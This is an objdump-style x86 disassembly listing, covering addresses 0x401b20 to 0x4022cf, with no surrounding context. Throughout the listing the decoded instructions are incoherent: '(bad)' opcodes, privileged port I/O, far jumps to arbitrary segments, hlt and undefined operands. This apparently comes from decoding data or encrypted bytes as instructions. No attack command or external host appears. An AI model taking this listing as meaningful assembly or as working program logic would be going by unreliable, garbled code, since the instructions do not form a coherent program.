  401b20:	mov    bl,0xdd
  401b22:	pusha  
  401b23:	sbb    BYTE PTR [edx],dl
  401b25:	push   edi
  401b26:	mov    WORD PTR [eax-0x68],?
  401b29:	pop    esi
  401b2a:	jns    0x401b19
  401b2c:	in     eax,dx
  401b2d:	aad    0x17
  401b2f:	mov    esi,0x8f01cc70
  401b34:	dec    ecx
  401b35:	jge    0x401ab9
  401b37:	pop    ds
  401b38:	sub    eax,0x12a71b42
  401b3d:	scas   eax,DWORD PTR es:[edi]
  401b3e:	gs pop ebx
  401b40:	add    ecx,0x266b55fa
  401b46:	cmp    BYTE PTR [ecx+0x73],ah
  401b49:	pop    esp
  401b4a:	and    eax,0x230ae702
  401b4f:	nop
  401b50:	test   BYTE PTR [edi-0x21],ch
  401b53:	mov    ss:0x56765ed5,ax
  401b5a:	enter  0x19e9,0xb4
  401b5e:	dec    DWORD PTR [edx+0xc]
  401b61:	or     al,0x75
  401b63:	pusha  
  401b64:	add    eax,0x8c9768f
  401b69:	dec    ebx
  401b6a:	push   ebx
  401b6b:	imul   eax,DWORD PTR [ebp+0x733feb62],0xffffffc7
  401b72:	clc    
  401b73:	add    ah,BYTE PTR [edx-0x52]
  401b76:	addr16 pusha 
  401b78:	pop    ecx
  401b79:	xor    eax,0xb3d8708f
  401b7e:	std    
  401b7f:	sti    
  401b80:	xor    DWORD PTR [esi+0x1dc25a2b],ecx
  401b86:	pushf  
  401b87:	mov    WORD PTR [ebx],?
  401b89:	mov    ch,0x50
  401b8b:	scas   al,BYTE PTR es:[edi]
  401b8c:	lahf   
  401b8d:	pop    eax
  401b8e:	fisttp QWORD PTR [ecx]
  401b90:	xchg   BYTE PTR [eax],dl
  401b92:	mov    eax,ds:0x202944c6
  401b97:	mov    ch,0xa7
  401b99:	enter  0x6ca1,0x9e
  401b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b9e:	dec    esp
  401b9f:	push   ds
  401ba0:	fistp  WORD PTR [ecx]
  401ba2:	cmovo  ebp,DWORD PTR [ebp+0x78]
  401ba6:	imul   edx,DWORD PTR [eax-0x3151c760],0x555134f5
  401bb0:	iret   
  401bb1:	ins    DWORD PTR es:[edi],dx
  401bb2:	dec    esp
  401bb3:	add    eax,0xf233748
  401bb8:	mov    edi,0xe418ac8a
  401bbd:	pop    ebp
  401bbe:	xchg   ebp,eax
  401bbf:	or     DWORD PTR ds:0x6281b23d,eax
  401bc5:	mov    dh,0xd0
  401bc7:	pop    ebx
  401bc8:	inc    eax
  401bc9:	in     eax,dx
  401bca:	mov    al,0xc8
  401bcc:	(bad)
  401bcf:	adc    dl,BYTE PTR [esp+esi*8-0x87e8b6d]
  401bd6:	and    dl,bl
  401bd8:	jb     0x401baa
  401bda:	mov    dh,0x6e
  401bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bde:	sbb    cl,ch
  401be0:	retf   0x36ee
  401be3:	and    BYTE PTR [edi],bl
  401be5:	(bad)  
  401be6:	add    ah,BYTE PTR ss:[edi+0x3c]
  401bea:	sbb    ecx,DWORD PTR [esi+eiz*4]
  401bed:	push   eax
  401bee:	sub    BYTE PTR [edx-0x4282dabb],bl
  401bf4:	jle    0x401c30
  401bf6:	mov    esi,0x922250ae
  401bfb:	out    dx,al
  401bfc:	dec    ebp
  401bfd:	xchg   ecx,eax
  401bfe:	xor    DWORD PTR [ebx*8-0x634f11e4],esp
  401c05:	fisub  WORD PTR [edx-0x32]
  401c08:	or     al,0x6d
  401c0a:	cmp    esp,DWORD PTR [eax+edi*2+0x63413d98]
  401c11:	push   ss
  401c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c13:	jl     0x401c61
  401c15:	add    bl,al
  401c17:	xor    ecx,edi
  401c19:	jns    0x401c96
  401c1b:	cmp    eax,0xa3675512
  401c20:	adc    ecx,DWORD PTR [eax+0x4f0a3aa3]
  401c26:	cmp    DWORD PTR [ecx+0x1c],eax
  401c29:	pop    esp
  401c2a:	adc    bl,ch
  401c2c:	rcl    edx,1
  401c2e:	cmc    
  401c2f:	mov    ds:0xd2372033,eax
  401c34:	loop   0x401c1a
  401c36:	mov    ah,0x59
  401c38:	mov    BYTE PTR [eax-0x7e0efa2b],dh
  401c3e:	clc    
  401c3f:	ins    BYTE PTR es:[edi],dx
  401c40:	pop    ecx
  401c41:	push   ebx
  401c42:	call   0xbf9b826f
  401c47:	and    eax,0x75a2e321
  401c4c:	dec    esi
  401c4d:	mov    al,0xd1
  401c4f:	clc    
  401c50:	xor    ch,BYTE PTR [esi+0x3b54e912]
  401c56:	pusha  
  401c57:	mov    bh,0xc4
  401c59:	mov    ecx,esp
  401c5b:	cmp    al,0x60
  401c5d:	pop    esi
  401c5e:	mov    al,ds:0xa7a7a35a
  401c63:	jne    0x401cb5
  401c65:	mov    ecx,0xe092a294
  401c6a:	add    eax,eax
  401c6c:	jecxz  0x401c20
  401c6e:	icebp  
  401c6f:	mov    dh,0x41
  401c71:	retf   
  401c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c73:	dec    edi
  401c74:	out    dx,eax
  401c75:	stc    
  401c76:	xchg   DWORD PTR [edx],eax
  401c78:	push   edi
  401c79:	mov    ebx,0xf7e5e4b6
  401c7e:	fisubr WORD PTR [ebx]
  401c80:	cmp    bh,BYTE PTR [eax]
  401c82:	sti    
  401c83:	daa    
  401c84:	jno    0x401c4a
  401c86:	xor    ecx,DWORD PTR [ebx+0x5b61769c]
  401c8c:	scas   al,BYTE PTR es:[edi]
  401c8d:	stc    
  401c8e:	shr    DWORD PTR [ecx],1
  401c90:	adc    DWORD PTR [ebx-0x2d],ebx
  401c93:	rcl    BYTE PTR [edx],cl
  401c95:	jge    0x401c1d
  401c97:	xchg   esi,eax
  401c98:	cdq    
  401c99:	ret    
  401c9a:	call   0x91bb:0x57597c9f
  401ca1:	mov    esi,0x50d18626
  401ca6:	sub    ax,0x83e3
  401caa:	pop    ebp
  401cab:	xor    DWORD PTR [esi+0x9],esp
  401cae:	dec    ecx
  401caf:	fld    st(5)
  401cb1:	and    eax,0x9708c856
  401cb6:	fld    DWORD PTR [ebp-0xd5d0c8d]
  401cbc:	sti    
  401cbd:	lds    esp,FWORD PTR [ebx+0x14]
  401cc0:	pop    es
  401cc1:	pop    edx
  401cc2:	in     eax,0xdd
  401cc4:	scas   eax,DWORD PTR es:[edi]
  401cc5:	cmp    al,0x3f
  401cc7:	loop   0x401c66
  401cc9:	mov    ecx,0xa956d56c
  401cce:	or     DWORD PTR [ebp+0x79],esi
  401cd1:	dec    ebx
  401cd2:	into   
  401cd3:	js     0x401cb6
  401cd5:	not    DWORD PTR [esi-0x50cf1b8]
  401cdb:	int    0x63
  401cdd:	sbb    eax,0x7b44a541
  401ce2:	sub    al,0x95
  401ce4:	adc    DWORD PTR [eax+0x75],esi
  401ce7:	ja     0x401cf1
  401ce9:	fidiv  DWORD PTR [edi]
  401ceb:	pop    edi
  401cec:	ror    eax,0x73
  401cef:	sahf   
  401cf0:	jle    0x401c88
  401cf2:	aam    0x12
  401cf4:	(bad)  
  401cf5:	out    0xe5,al
  401cf7:	mov    esi,0x400b5256
  401cfc:	jne    0x401c94
  401cfe:	pushf  
  401cff:	sub    dl,dh
  401d01:	cmp    edi,0x1e
  401d04:	(bad)  
  401d05:	cmc    
  401d06:	inc    edx
  401d07:	xor    eax,0x370fa11b
  401d0c:	push   ebp
  401d0d:	xchg   esp,eax
  401d0e:	inc    ebx
  401d0f:	mov    ecx,0x205ff38e
  401d14:	ins    BYTE PTR es:[edi],dx
  401d15:	push   ds
  401d16:	sub    ecx,DWORD PTR [esi]
  401d18:	fidivr DWORD PTR [edx+0x7d67b053]
  401d1e:	int3   
  401d1f:	std    
  401d20:	cmp    BYTE PTR [esi],cl
  401d22:	push   ss
  401d23:	fwait
  401d24:	push   edi
  401d25:	mov    esp,0x8b8d18ba
  401d2a:	ss xchg edx,eax
  401d2c:	jl     0x401d99
  401d2e:	or     DWORD PTR [esi+eiz*4],eax
  401d31:	jnp    0x401cf9
  401d33:	ins    DWORD PTR es:[edi],dx
  401d34:	int    0x98
  401d36:	inc    edi
  401d37:	and    al,0x69
  401d39:	dec    ecx
  401d3a:	push   es
  401d3b:	dec    edi
  401d3c:	pop    ebx
  401d3d:	or     al,0x36
  401d3f:	push   esp
  401d40:	inc    ebx
  401d41:	stc    
  401d42:	daa    
  401d43:	gs adc eax,0x41f03015
  401d49:	mov    esi,0xe99a172d
  401d4e:	jmp    0xba84:0xd24c4f4f
  401d55:	jns    0x401d0e
  401d57:	cmp    DWORD PTR [ebp-0x3dbb7b1c],ecx
  401d5d:	stc    
  401d5e:	mov    dl,0x23
  401d60:	les    eax,FWORD PTR [eax+0xc4b0076]
  401d66:	xor    BYTE PTR [eax],0xf4
  401d69:	retf   
  401d6a:	icebp  
  401d6b:	jmp    0x401d28
  401d6d:	mov    cl,ch
  401d6f:	push   ss
  401d70:	adc    dl,ah
  401d72:	shl    dl,1
  401d74:	push   esi
  401d75:	in     eax,dx
  401d76:	sbb    ecx,DWORD PTR [ecx+0x633d29da]
  401d7c:	ss daa 
  401d7e:	in     al,0x48
  401d80:	mov    ecx,DWORD PTR [ecx]
  401d82:	mov    ecx,0x88382c
  401d87:	push   esi
  401d88:	dec    ecx
  401d89:	arpl   WORD PTR [ecx+0x6a],dx
  401d8c:	inc    esi
  401d8d:	adc    eax,0x3196c402
  401d92:	mov    ah,0x23
  401d94:	add    edi,edi
  401d96:	es cld 
  401d98:	hlt    
  401d99:	cmp    bl,dl
  401d9b:	mov    ah,0xc4
  401d9d:	repz cmp DWORD PTR [ebx-0x69],esi
  401da1:	loope  0x401dd7
  401da3:	rol    BYTE PTR [ebx-0x5b3684d3],0xe
  401daa:	cdq    
  401dab:	xor    ebx,DWORD PTR [ecx+0x1c83c512]
  401db1:	xchg   ebp,eax
  401db2:	mov    ds:0x63f0e322,al
  401db7:	cdq    
  401db8:	mov    ch,0xa6
  401dba:	daa    
  401dbb:	call   FWORD PTR [ecx+edx*2-0x4572de4d]
  401dc2:	into   
  401dc3:	sub    DWORD PTR [edx+ecx*8+0x153ed3df],ecx
  401dca:	mov    ds:0x6518d1fd,eax
  401dd0:	inc    eax
  401dd1:	push   ss
  401dd2:	pop    ss
  401dd3:	push   0xa277f1db
  401dd8:	or     esp,ecx
  401dda:	inc    ebp
  401ddb:	adc    eax,0x1b5a0afd
  401de0:	(bad)  
  401de1:	jecxz  0x401dfd
  401de3:	std    
  401de4:	inc    edx
  401de5:	imul   ebx,DWORD PTR [edi+0x1a0f9ca1],0xffffffb5
  401dec:	adc    BYTE PTR [ecx+eiz*1],0x2f
  401df0:	sub    al,0x94
  401df2:	fimul  WORD PTR [edi+ebx*8-0x313d8231]
  401df9:	jo     0x401e48
  401dfb:	in     eax,0xc8
  401dfd:	pop    ebx
  401dfe:	mov    edx,0xec92c0e4
  401e03:	fs mov al,0x30
  401e06:	cdq    
  401e07:	jp     0x401db9
  401e09:	cdq    
  401e0a:	mov    cl,0xe9
  401e0c:	or     cl,al
  401e0e:	jecxz  0x401e5e
  401e10:	lock pop ecx
  401e12:	mov    ds:0xd272864b,eax
  401e17:	xchg   BYTE PTR [esi+eiz*2],al
  401e1a:	call   0xa36b706e
  401e1f:	ds jg  0x401dd0
  401e22:	repnz push ss
  401e24:	and    bl,BYTE PTR [ebp+edi*2+0x6c218043]
  401e2b:	cmp    eax,0x38314cf2
  401e30:	pop    es
  401e31:	jecxz  0x401e21
  401e33:	into   
  401e34:	or     dh,BYTE PTR [ecx+ebp*8]
  401e37:	and    BYTE PTR [eax+0x15],dh
  401e3a:	aad    0x13
  401e3c:	sbb    bh,0x11
  401e3f:	mov    edi,0x214aa9ce
  401e44:	mov    ch,0x5f
  401e46:	pop    esi
  401e47:	jmp    0x401e08
  401e49:	mov    ebx,0x7fc7aee0
  401e4e:	fs pop eax
  401e50:	jle    0x401def
  401e52:	jmp    0x401e52
  401e54:	mov    BYTE PTR [ecx],0xbc
  401e57:	jp     0x401e6b
  401e59:	pusha  
  401e5a:	pop    ebx
  401e5b:	out    dx,al
  401e5c:	daa    
  401e5d:	inc    ebp
  401e5e:	cld    
  401e5f:	data16 mov ?,WORD PTR gs:[edi+0x7645b679]
  401e67:	or     al,0xb3
  401e69:	jl     0x401e87
  401e6b:	js     0x401e07
  401e6d:	call   0x9e28:0x4ee30a81
  401e74:	test   al,0x4a
  401e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e77:	jnp    0x401e3c
  401e79:	scas   al,BYTE PTR es:[edi]
  401e7a:	add    ch,BYTE PTR [eax]
  401e7c:	cmp    al,0x5c
  401e7e:	leave  
  401e7f:	jae    0x401e89
  401e81:	mov    dh,0xdb
  401e83:	mov    edx,0x69dd4456
  401e88:	push   cs
  401e89:	add    al,0x32
  401e8b:	aas    
  401e8c:	icebp  
  401e8d:	mov    edx,0x8fba21cb
  401e92:	dec    ebp
  401e93:	ror    DWORD PTR [ebp-0x5d],cl
  401e96:	add    cl,bl
  401e98:	rcl    BYTE PTR [edx+0x48],1
  401e9b:	ins    BYTE PTR es:[edi],dx
  401e9c:	adc    BYTE PTR [ecx-0xa9ef8b5],bh
  401ea2:	inc    eax
  401ea3:	out    0x60,al
  401ea5:	(bad)  
  401ea6:	in     al,0x4c
  401ea8:	adc    eax,0x418d885e
  401ead:	das    
  401eae:	scas   al,BYTE PTR es:[edi]
  401eaf:	inc    edi
  401eb0:	scas   al,BYTE PTR es:[edi]
  401eb1:	ins    BYTE PTR es:[edi],dx
  401eb2:	out    dx,eax
  401eb3:	xchg   DWORD PTR [esi+0x72],ebp
  401eb6:	jg     0x401ebc
  401eb8:	or     BYTE PTR [edi+0x458ba3bf],ah
  401ebe:	ds inc esi
  401ec0:	ror    DWORD PTR [esi-0x46f384ef],0x4d
  401ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec8:	out    0x83,al
  401eca:	push   cs
  401ecb:	push   ds
  401ecc:	jbe    0x401ed0
  401ece:	lock xlat BYTE PTR ds:[ebx]
  401ed0:	pop    ss
  401ed1:	or     BYTE PTR [esi+0x427a6ccd],cl
  401ed7:	test   al,0xeb
  401ed9:	fnstsw WORD PTR [ecx+ebp*1+0x2]
  401edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ede:	imul   edi,ebx,0x4d
  401ee1:	and    edx,DWORD PTR [eax+0x1]
  401ee4:	retf   
  401ee5:	(bad)  
  401ee6:	mov    gs,eax
  401ee8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eea:	pop    edx
  401eeb:	aam    0x5d
  401eed:	fwait
  401eee:	aas    
  401eef:	(bad)  
  401ef0:	sub    al,0xdf
  401ef2:	test   DWORD PTR [edx],esi
  401ef4:	daa    
  401ef5:	push   ss
  401ef6:	mov    esp,0x8dfdf3d5
  401efb:	xchg   ebx,eax
  401efc:	inc    ecx
  401efd:	idiv   DWORD PTR [ecx+0x10]
  401f00:	call   0x51f07554
  401f05:	mov    ds:0x806f717e,al
  401f0a:	xchg   esi,eax
  401f0b:	and    al,0x2
  401f0e:	mov    dl,0x66
  401f10:	xlat   BYTE PTR ds:[ebx]
  401f11:	bound  edx,QWORD PTR [eax-0x6a]
  401f14:	fs mov edi,0x12810fa1
  401f1a:	ret    
  401f1b:	mov    ebp,0x36346615
  401f20:	rcl    ah,1
  401f22:	adc    edi,DWORD PTR [ebx]
  401f24:	xchg   BYTE PTR [esi],dl
  401f26:	sbb    bl,bh
  401f28:	and    BYTE PTR [ebx],0xba
  401f2b:	xchg   edi,eax
  401f2c:	rol    DWORD PTR [eax-0x62],1
  401f2f:	leave  
  401f30:	imul   edx,DWORD PTR [edi-0x45],0x47
  401f34:	test   al,0xa7
  401f36:	sbb    DWORD PTR [ebp+0x27],0xa7188167
  401f3d:	retf   0x63d0
  401f40:	mov    dl,0x9e
  401f42:	into   
  401f43:	sbb    BYTE PTR [ebx+0x49],bh
  401f46:	xlat   BYTE PTR ds:[ebx]
  401f47:	dec    eax
  401f48:	(bad)  
  401f49:	jmp    0xeaec950e
  401f4e:	mov    gs,edi
  401f50:	lahf   
  401f51:	loopne 0x401f92
  401f53:	add    DWORD PTR [ebx+0x7fc0b6c7],ebx
  401f59:	mov    WORD PTR [ecx],es
  401f5b:	mov    esp,0x4eec392
  401f60:	ins    BYTE PTR es:[edi],dx
  401f61:	jmp    0x401fcf
  401f63:	xchg   DWORD PTR [ebx],esp
  401f65:	mov    ebx,0x456dbebc
  401f6a:	mov    ch,dl
  401f6c:	jmp    0xee0099f3
  401f71:	(bad)  
  401f72:	or     BYTE PTR [ebx+0x451276d4],bh
  401f78:	sti    
  401f79:	(bad)  
  401f7a:	inc    eax
  401f7c:	pop    edi
  401f7d:	in     al,dx
  401f7e:	fmul   QWORD PTR [esi-0x72]
  401f81:	jae    0x401f7e
  401f83:	cld    
  401f84:	stos   DWORD PTR es:[edi],eax
  401f85:	inc    eax
  401f86:	mov    dh,0x10
  401f88:	cwde   
  401f89:	hlt    
  401f8a:	jle    0x401f13
  401f8c:	cdq    
  401f8d:	mov    ebp,0x59c11ca5
  401f92:	mov    al,0xed
  401f94:	pop    edx
  401f95:	and    eax,0x1a1cb82a
  401f9a:	scas   eax,DWORD PTR es:[edi]
  401f9b:	pop    esi
  401f9c:	adc    ebx,ebx
  401f9e:	popa   
  401f9f:	and    al,0xba
  401fa1:	out    dx,al
  401fa2:	mov    DWORD PTR [eax],esp
  401fa4:	jo     0x40201f
  401fa6:	fistp  WORD PTR [edi]
  401fa8:	inc    edx
  401fa9:	xchg   ebx,eax
  401faa:	daa    
  401fab:	lea    esi,[ebx]
  401fad:	inc    ebx
  401fae:	cmp    ebp,DWORD PTR [edi-0x4b949057]
  401fb4:	xlat   BYTE PTR ds:[ebx]
  401fb5:	add    eax,0xc919d3ed
  401fba:	push   esp
  401fbb:	mov    ds:0x10455353,eax
  401fc0:	ins    BYTE PTR es:[edi],dx
  401fc1:	in     al,dx
  401fc2:	dec    ebp
  401fc3:	int    0xf
  401fc5:	pop    edi
  401fc6:	mov    bh,0x4f
  401fc8:	test   al,0xdb
  401fca:	clc    
  401fcb:	sub    ebx,DWORD PTR [edx+0x75]
  401fce:	xlat   BYTE PTR ds:[ebx]
  401fcf:	lahf   
  401fd0:	jb     0x401f9b
  401fd2:	mov    ds:0xd0026569,eax
  401fd7:	pop    ecx
  401fd8:	out    0x6f,al
  401fda:	sub    DWORD PTR [ecx+0xf],esi
  401fdd:	mov    ecx,0x3a50a762
  401fe2:	xchg   esp,eax
  401fe3:	adc    BYTE PTR [ebx],al
  401fe5:	inc    edi
  401fe6:	jp     0x401fec
  401fe8:	and    al,0x17
  401fea:	leave  
  401feb:	inc    ebx
  401fec:	cmp    BYTE PTR [edx+ecx*4],al
  401fef:	push   cs
  401ff0:	and    esp,ebx
  401ff2:	cmp    ebx,DWORD PTR [eax+0x39]
  401ff5:	xchg   ecx,eax
  401ff6:	sub    al,0xd4
  401ff8:	mov    ch,0x8f
  401ffa:	fmul   DWORD PTR [esi+0x1b8acc44]
  402000:	imul   DWORD PTR [ebp-0x337ffedc]
  402006:	cmp    dl,BYTE PTR [ebp+0xc]
  402009:	ret    0x57fb
  40200c:	ret    
  40200d:	pushf  
  40200e:	jb     0x402050
  402010:	addr16 xchg edi,eax
  402012:	xchg   DWORD PTR [edx],ecx
  402014:	or     al,BYTE PTR [ecx-0x78e5b1c8]
  40201a:	mov    ds:0xe8714e5b,al
  40201f:	jbe    0x402055
  402021:	and    bh,ch
  402023:	dec    ebp
  402024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402025:	out    dx,eax
  402026:	mov    ds:0x142f0e6b,al
  40202b:	inc    ecx
  40202c:	xchg   edi,eax
  40202d:	mov    esp,0xb92e006e
  402032:	adc    dh,bl
  402034:	daa    
  402035:	and    DWORD PTR [ebp-0x6b59468],ecx
  40203b:	push   esi
  40203c:	adc    DWORD PTR [esp+ecx*8-0x37],ebx
  402040:	imul   ebp,DWORD PTR [eax+0x4],0xffffffa5
  402044:	cld    
  402045:	imul   eax,DWORD PTR [ecx+ebx*2],0xffffffcc
  402049:	fnsave [edx+0x2a374ca9]
  40204f:	pop    ds
  402050:	les    eax,FWORD PTR ds:0x3cc09251
  402056:	test   eax,0xda05eeaf
  40205b:	mov    ebp,0x2b5143b3
  402060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402061:	mov    cl,0x27
  402063:	xchg   ebx,eax
  402064:	mov    ebx,0xdc20c92b
  402069:	or     eax,0x83cd84d3
  40206e:	jnp    0x40203a
  402070:	push   es
  402071:	jnp    0x402042
  402073:	hlt    
  402074:	add    al,0xac
  402076:	ja     0x402076
  402078:	jp     0x40202a
  40207a:	sbb    al,0x70
  40207c:	push   es
  40207d:	popa   
  40207e:	pop    edx
  40207f:	dec    esp
  402080:	js     0x40209d
  402082:	call   0xd71e27a7
  402087:	inc    ebp
  402088:	das    
  402089:	pop    ebx
  40208a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40208b:	dec    ecx
  40208c:	adc    ecx,edx
  40208e:	das    
  40208f:	jno    0x40210c
  402091:	sbb    dl,BYTE PTR [edi]
  402093:	cmp    al,0xc
  402095:	mov    DWORD PTR [edi+0x5944cd55],ecx
  40209b:	lock in al,0xc8
  40209e:	add    dh,BYTE PTR [ecx]
  4020a0:	xor    esi,DWORD PTR [edi+0x7e19d66d]
  4020a6:	(bad)  
  4020a7:	xor    al,0x4b
  4020a9:	xchg   ecx,eax
  4020ab:	mul    DWORD PTR [ecx-0x1e]
  4020ae:	icebp  
  4020af:	cmp    al,0x8e
  4020b1:	push   ds
  4020b2:	cmp    edx,eax
  4020b4:	xor    DWORD PTR [ebp-0x61],edx
  4020b7:	pop    ebx
  4020b8:	or     BYTE PTR [ecx],bl
  4020ba:	add    ah,ah
  4020bc:	xor    al,0x87
  4020be:	sbb    esp,DWORD PTR [ebx]
  4020c0:	mov    al,ds:0x88424eb7
  4020c5:	gs push edi
  4020c7:	push   0x7b
  4020c9:	imul   ecx,DWORD PTR [eax-0x69b60e73],0xdbb16b3a
  4020d3:	mov    cl,ah
  4020d5:	mov    bh,0x90
  4020d7:	lahf   
  4020d8:	mov    eax,0x82464ec
  4020dd:	inc    esi
  4020de:	ret    
  4020df:	fdivr  QWORD PTR [esp+eax*1]
  4020e2:	pop    eax
  4020e3:	ss xchg ebp,eax
  4020e5:	pop    ds
  4020e6:	shl    DWORD PTR [esp+edi*2+0x27],0x8a
  4020eb:	aas    
  4020ec:	mov    bh,0x36
  4020ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020ef:	(bad)  
  4020f0:	loop   0x4020cc
  4020f2:	fwait
  4020f3:	pop    ebx
  4020f4:	or     DWORD PTR [esi+0x9e40b01],edx
  4020fa:	sbb    al,0x4f
  4020fc:	pop    es
  4020fd:	push   0xe39d2572
  402102:	rol    BYTE PTR [edx],1
  402104:	jle    0x402180
  402106:	test   DWORD PTR [edi-0x58281595],ecx
  40210c:	and    al,0x6
  40210e:	jne    0x402137
  402110:	jle    0x4020e7
  402112:	inc    ebx
  402113:	push   ecx
  402114:	push   eax
  402115:	adc    eax,0x7de67b4a
  40211a:	dec    esi
  40211b:	(bad)  
  40211c:	out    0xf9,al
  40211e:	or     al,0x7d
  402120:	mov    dl,0x98
  402122:	ss pop ss
  402124:	loopne 0x4020e6
  402126:	dec    esi
  402127:	inc    esp
  402128:	add    DWORD PTR [edx+0x64feda2a],eax
  40212e:	sub    eax,0x7f4f68bb
  402133:	in     al,dx
  402134:	popf   
  402135:	(bad)  
  402136:	jnp    0x40218f
  402138:	cld    
  402139:	scas   eax,DWORD PTR es:[edi]
  40213a:	jecxz  0x402163
  40213c:	(bad)  
  40213e:	cmp    al,0xaf
  402140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402141:	mov    edx,0x45fa27a8
  402146:	cmp    eax,0xebfdf460
  40214b:	jbe    0x402182
  40214d:	(bad)  
  40214e:	test   DWORD PTR [ebx],0xd8f42b15
  402154:	les    eax,FWORD PTR [ecx-0x45]
  402157:	loopne 0x4020e7
  402159:	shl    DWORD PTR [edx],1
  40215b:	add    eax,DWORD PTR [ebx+0xf]
  40215e:	push   edx
  40215f:	jnp    0x4020ee
  402161:	pop    esi
  402162:	mov    dh,0xeb
  402164:	or     dl,BYTE PTR [edi+0x7d]
  402167:	addr16 aaa 
  402169:	lock adc BYTE PTR [ebp+0x66],bl
  40216d:	imul   eax,DWORD PTR [edx-0x38fdece0],0x6a
  402174:	jae    0x402187
  402176:	mov    bh,0x74
  402178:	aaa    
  402179:	sub    al,0x64
  40217b:	mov    ecx,0xec8c4a8
  402180:	outs   dx,BYTE PTR ss:[esi]
  402182:	jno    0x40210e
  402184:	sbb    BYTE PTR [edi+0x212db28c],ah
  40218a:	or     ebx,DWORD PTR ds:[esi+0x1c]
  40218e:	addr16 jb 0x402174
  402191:	sub    eax,0xbcf254d7
  402196:	jae    0x40215b
  402198:	mov    bl,0xc9
  40219a:	arpl   WORD PTR [ebp-0x15],bp
  40219d:	hlt    
  40219e:	jle    0x4021d2
  4021a0:	out    dx,al
  4021a1:	pop    ecx
  4021a2:	jmp    0xc6e2114
  4021a7:	enter  0xf483,0xb8
  4021ab:	loop   0x4021c6
  4021ad:	or     al,0xe2
  4021af:	imul   edx,DWORD PTR [esi-0x216b71fd],0x17
  4021b6:	jmp    0x52dc81f3
  4021bb:	xchg   ecx,eax
  4021bc:	add    al,0x25
  4021be:	mov    ds:0x3d2ce680,al
  4021c3:	jnp    0x402242
  4021c5:	data16 sbb dl,BYTE PTR [ebx+eax*1]
  4021c9:	add    BYTE PTR [ecx+0x70],bh
  4021cc:	pop    ds
  4021cd:	cld    
  4021ce:	xor    eax,0x9e69b4cc
  4021d3:	stos   BYTE PTR es:[edi],al
  4021d4:	dec    edi
  4021d5:	add    dh,BYTE PTR [esi+0x6c81c4ad]
  4021db:	shr    BYTE PTR ds:0xd0a7a239,cl
  4021e1:	arpl   WORD PTR [ecx+eiz*1],cx
  4021e4:	cdq    
  4021e5:	(bad)  
  4021e6:	xlat   BYTE PTR ds:[ebx]
  4021e7:	into   
  4021e8:	mov    eax,0x55aede18
  4021ed:	mov    BYTE PTR [edi-0x14],0xb4
  4021f1:	pop    eax
  4021f2:	adc    eax,0x3f953895
  4021f7:	lahf   
  4021f8:	xchg   esi,eax
  4021f9:	bound  esp,QWORD PTR gs:[edx]
  4021fc:	jl     0x40220c
  4021fe:	mov    ds:0x3b6b6964,eax
  402203:	jne    0x40221e
  402205:	mov    al,ds:0x1ea02d1
  40220a:	push   ebp
  40220b:	xchg   ecx,eax
  40220c:	rcl    DWORD PTR [ebp+0x7c],1
  40220f:	iret   
  402210:	mov    ah,0x40
  402212:	scas   eax,DWORD PTR es:[edi]
  402213:	xor    al,0x37
  402215:	sbb    BYTE PTR [edi-0x5606cf89],al
  40221b:	in     eax,0xc2
  40221d:	push   es
  40221e:	fisttp DWORD PTR [ebx-0x78]
  402221:	sub    eax,DWORD PTR [edi-0x581377df]
  402227:	push   edi
  402228:	stc    
  402229:	xor    edi,edi
  40222b:	jge    0x4021d5
  40222d:	cmp    eax,0x5e8394b2
  402232:	aaa    
  402233:	lahf   
  402234:	sbb    ecx,DWORD PTR [ebx+0x37a4f1c6]
  40223a:	loope  0x402295
  40223c:	cs dec eax
  40223e:	push   eax
  40223f:	adc    dh,BYTE PTR [edi+0x31]
  402242:	rcl    BYTE PTR [ecx+0x145104e5],cl
  402248:	xchg   BYTE PTR [eax+0x7],ah
  40224b:	outs   dx,BYTE PTR ds:[esi]
  40224c:	cld    
  40224d:	addr16 mov edi,0x51f85658
  402253:	je     0x40222d
  402255:	or     al,0x7f
  402257:	push   ecx
  402258:	les    esi,FWORD PTR [ecx-0x69]
  40225b:	std    
  40225c:	sub    BYTE PTR [edi],dh
  40225e:	adc    edi,DWORD PTR [edx-0x30]
  402261:	mov    ds:0xe2bdf657,al
  402266:	mov    ecx,0xfe8a41f1
  40226b:	loope  0x4022eb
  40226d:	ins    DWORD PTR es:[edi],dx
  40226e:	xor    eax,DWORD PTR [esi]
  402270:	call   0x8db3f529
  402275:	aad    0xca
  402277:	lea    ebp,[edi]
  402279:	mov    ecx,0x724e1d75
  40227e:	push   es
  40227f:	and    edx,DWORD PTR [esi]
  402281:	in     al,dx
  402282:	lea    ebp,[edx]
  402284:	mov    edx,?
  402286:	nop
  402287:	and    DWORD PTR [edi],0xffffff91
  40228a:	pop    ss
  40228b:	hlt    
  40228c:	test   ch,dl
  40228e:	lock sub eax,0x1be89c5e
  402294:	pushf  
  402295:	jecxz  0x402244
  402297:	es sahf 
  402299:	nop
  40229a:	or     al,BYTE PTR [eax+esi*4-0x4e5097af]
  4022a1:	ins    BYTE PTR es:[edi],dx
  4022a2:	out    dx,al
  4022a3:	inc    ecx
  4022a4:	repnz or bh,BYTE PTR [esi]
  4022a7:	add    al,BYTE PTR [edx+eiz*4+0x516e2e5a]
  4022ae:	scas   al,BYTE PTR es:[edi]
  4022af:	retf   0xcb78
  4022b2:	stos   BYTE PTR es:[edi],al
  4022b3:	addr16 push ds
  4022b5:	aas    
  4022b6:	sahf   
  4022b7:	add    eax,0x95426830
  4022bc:	mov    DWORD PTR ds:[eax+0x66],eax
  4022c0:	inc    esi
  4022c1:	pop    eax
  4022c2:	mov    esi,0x2ff5c49
  4022c7:	or     al,0xdd
  4022c9:	push   eax
  4022ca:	jo     0x4022dc
  4022cc:	xor    ebx,DWORD PTR [esp+ecx*4]
  4022cf:	jl     0x4022a4
